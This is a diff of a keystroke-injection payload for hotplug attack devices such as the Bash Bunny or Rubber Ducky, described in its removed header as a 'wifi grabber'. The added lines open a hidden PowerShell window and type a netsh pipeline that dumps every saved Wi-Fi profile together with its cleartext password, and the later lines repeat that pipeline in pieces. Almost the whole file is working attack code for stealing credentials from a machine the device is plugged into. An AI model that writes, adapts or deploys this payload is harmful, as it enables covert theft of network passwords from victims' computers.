@@ -1,9 +1,28 @@
-# This is a wifi grabber script that can run on the Bash Bunny, Rubber Ducky, or any other hotplug attack device
-#Made By: Eduardo Corazon
-#
 
-command:
-(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$network=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$network" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$password=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ NETWORK_NAME=$network;PASSWORD=$password }} | Format-Table -AutoSize
 
-Manual:
+Q DELAY 500
+Q RUN WIN powershell.exe -WindowStyle hidden 
+Q STRING (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$network=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$network" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$password=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ NETWORK_NAME=$network;PASSWORD=$password }} | Format-Table -AutoSize
+Q ENTER
+LED G
+
+Q STRING (netsh wlan show profiles)
+Q SPACE 
+Q STRING | Select-String "\:(.+)$"
+Q SPACE  
+Q STRING | %{$network=$_.Matches.Groups[1].Value.Trim(); $_}
+Q SPACE  
+Q STRING | %{(netsh wlan show profile name="$network" key=clear)}
+Q SPACE   
+Q STRING | Select-String "Key Content\W+\:(.+)$" 
+Q SPACE 
+Q STRING | %{$password=$_.Matches.Groups[1].Value.Trim(); $_} 
+Q SPACE 
+Q STRING | %{[PSCustomObject]@{ NETWORK_NAME=$network;PASSWORD=$password }} 
+Q SPACE 
+Q STRING | Format-Table -AutoSize
+Q SPACE 
+Q ENTER
+
+(netsh wlan show profiles) |Select-String":"|%{$network=$_.Matches.Groups[1].Value.Trim();$_}|%{(netsh wlan show profile name="$network" key=clear)}|Select-String "Key Content\W+\:(.+)$" | %{$password=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ NETWORK_NAME=$network;PASSWORD=$password }}
 
